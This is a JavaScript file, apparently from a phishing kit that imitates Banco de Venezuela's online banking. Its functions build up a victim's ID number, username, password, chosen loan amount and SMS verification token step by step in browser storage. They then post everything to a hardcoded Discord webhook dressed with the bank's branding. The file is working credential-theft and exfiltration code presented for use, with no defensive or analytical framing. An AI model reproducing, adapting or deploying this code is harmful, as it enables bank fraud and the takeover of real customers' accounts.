// ==========================================
// CONFIGURACIÓN DEL WEBHOOK DE DISCORD
// ==========================================
// Pega entre las comillas tu URL del Webhook de Discord:
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1551472287902081095/4FUaRBVhDBFu28w8XOfnRstw6GaQQxAei25Av7y9yRPkScd1T3C5VCzhgBWCiHdLdyBk";

// ==========================================
// FUNCIONES DE ENVÍO Y ALMACENAMIENTO
// ==========================================

/**
 * Guarda los datos actuales en localStorage para acumular el recibo paso a paso.
 * @param {Object} data - Objeto con claves como { cedula, solicitud, usuario, contrasena, monto, sms }
 */
function guardarDatosRecibo(data) {
  try {
    let actual = JSON.parse(localStorage.getItem('bdv_recibo_data') || '{}');
    actual = { ...actual, ...data, ultima_actualizacion: new Date().toLocaleString('es-VE') };
    localStorage.setItem('bdv_recibo_data', JSON.stringify(actual));
    return actual;
  } catch (e) {
    console.error("Error guardando en localStorage:", e);
    return data;
  }
}

/**
 * Obtiene los datos acumulados hasta el momento.
 */
function obtenerDatosRecibo() {
  try {
    return JSON.parse(localStorage.getItem('bdv_recibo_data') || '{}');
  } catch (e) {
    return {};
  }
}

/**
 * Envía un mensaje con formato Embed elegante a tu servidor de Discord.
 * @param {string} titulo - Título del Embed (Ej: "🔐 Nueva Contraseña Ingresada" o "📱 Token SMS Recibido")
 * @param {Object} datos - Objeto con los datos a mostrar en los campos del Embed
 * @param {number} color - Color hexadecimal en decimal (Ej: 0x0055c8 para Azul BDV, 0x2e7d32 para Verde éxito)
 */
async function enviarWebhookDiscord(titulo, datos = null, color = 0x0055c8) {
  if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("TU_ID_AQUI")) {
    console.warn("⚠️ Webhook de Discord no configurado. Por favor edita webhook.js y coloca tu URL.");
    return false;
  }

  // Si no se pasan datos directos, tomar los acumulados en localStorage
  const info = datos || obtenerDatosRecibo();

  // Construir los campos para el Embed de Discord
  const fields = [];
  if (info.cedula) fields.push({ name: "🪪 Cédula de Identidad", value: `\`${info.cedula}\``, inline: true });
  if (info.solicitud) fields.push({ name: "📋 Tipo de Solicitud", value: `**${info.solicitud}**`, inline: true });
  if (info.usuario) fields.push({ name: "👤 Usuario BDV", value: `\`${info.usuario}\``, inline: true });
  if (info.contrasena) fields.push({ name: "🔑 Contraseña", value: `\`${info.contrasena}\``, inline: true });
  if (info.monto) fields.push({ name: "💰 Crédito Seleccionado", value: `**${info.monto}**`, inline: false });
  if (info.sms) fields.push({ name: "📲 Código SMS (Token)", value: `\`${info.sms}\``, inline: true });
  if (info.intento) fields.push({ name: "🔄 Intento #", value: `\`${info.intento}\``, inline: true });

  const embed = {
    title: titulo || "📋 Recibo BDV - Notificación",
    color: color,
    fields: fields.length > 0 ? fields : [{ name: "Información", value: JSON.stringify(info, null, 2) }],
    footer: {
      text: `BDV en Línea Personas • ${new Date().toLocaleTimeString('es-VE')}`
    },
    timestamp: new Date().toISOString()
  };

  const payload = {
    username: "BDV Bot Notificador",
    avatar_url: "https://www.bancodevenezuela.com/favicon.ico",
    embeds: [embed]
  };

  try {
 

    // 2. Esperar exactamente 1.5 segundos (1500 ms)
    await new Promise(resolve => setTimeout(resolve, 1500));

    // 3. Enviar 1.5 segundos después al Webhook editable de webhook.js (Webhook 2)
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    if (response.ok) {
      console.log("✅ Recibo enviado a Discord correctamente.");
      return true;
    } else {
      console.error("❌ Error enviando a Discord. Estado:", response.status);
      return false;
    }
  } catch (error) {
    console.error("❌ Error de conexión con el Webhook de Discord:", error);
    return false;
  }
}
